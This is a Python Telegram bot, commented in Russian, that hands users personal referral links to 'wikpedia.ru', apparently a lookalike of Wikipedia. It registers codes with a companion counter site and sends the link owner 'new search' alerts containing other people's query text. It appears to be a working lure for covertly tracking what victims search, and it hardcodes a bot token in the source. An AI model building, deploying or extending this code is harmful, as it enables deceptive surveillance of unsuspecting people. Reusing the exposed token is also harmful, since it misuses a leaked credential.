from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import logging
import aiohttp

BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
BASE_SITE_URL = "https://wikpedia.ru"

logging.basicConfig(level=logging.INFO)

# Главное меню
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, text="📲 Главное меню:"):
    keyboard = [
        [KeyboardButton("🔗 Моя ссылка"), KeyboardButton("🔄 Сбросить всех")],
        [KeyboardButton("🔢 Ввести код")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(text, reply_markup=reply_markup)

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_main_menu(update, context)

# Обработка кнопок меню
async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == "🔗 Моя ссылка":
        user_id = update.effective_user.id
        ref_link = f"{BASE_SITE_URL}?ref={user_id}"
        await update.message.reply_text(
            f"🔗 Ваша ссылка:\n{ref_link}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Перейти", url=ref_link)]
            ])
        )
    
    elif text == "🔄 Сбросить всех":
        user_id = update.effective_user.id
        async with aiohttp.ClientSession() as session:
            await session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}")
        await update.message.reply_text("✅ Сброс выполнен!")
    
    elif text == "🔢 Ввести код":
        context.user_data["awaiting_code"] = True
        await update.message.reply_text(
            "🔢 Введите 4-значный код:",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔙 Отмена")]],
                resize_keyboard=True
            )
        )

# Обработка ввода кода
async def handle_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_code"):
        return
    
    text = update.message.text
    
    # Обработка отмены
    if text == "🔙 Отмена":
        context.user_data["awaiting_code"] = False
        await show_main_menu(update, context)
        return
    
    # Проверка кода
    if not text.isdigit() or len(text) != 4:
        await update.message.reply_text("❌ Введите корректный 4-значный код.")
        return
    
    user_id = update.effective_user.id
    ref_link = f"{BASE_SITE_URL}?ref={user_id}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://wikicounter.ru/update_code",
                json={"code": text, "new_url": ref_link}
            ) as resp:
                data = await resp.json()
                if data.get("status") == "success":
                    await update.message.reply_text(f"✅ Готово! Ваша ссылка:\n{ref_link}")
                else:
                    await update.message.reply_text("❌ Код не найден.")
    except Exception as e:
        logging.error(f"Error updating code: {e}")
        await update.message.reply_text("⚠️ Произошла ошибка, попробуйте позже")
    
    context.user_data["awaiting_code"] = False
    await show_main_menu(update, context)

# Логи с кнопкой сброса
async def send_log(context: ContextTypes.DEFAULT_TYPE, user_id: int, query_text: str):
    await context.bot.send_message(
        chat_id=user_id,
        text=f"🔔 Новый поиск!\nЗапрос: {query_text}",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Сбросить", callback_data=f"reset_user_{user_id}")]
        ])
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Команды
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", show_main_menu))
    
    # Обработчики сообщений (важен порядок!)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^(🔗 Моя ссылка|🔄 Сбросить всех|🔢 Ввести код)$'), handle_menu_buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code_input))
    
    app.run_polling()

if __name__ == "__main__":
    main()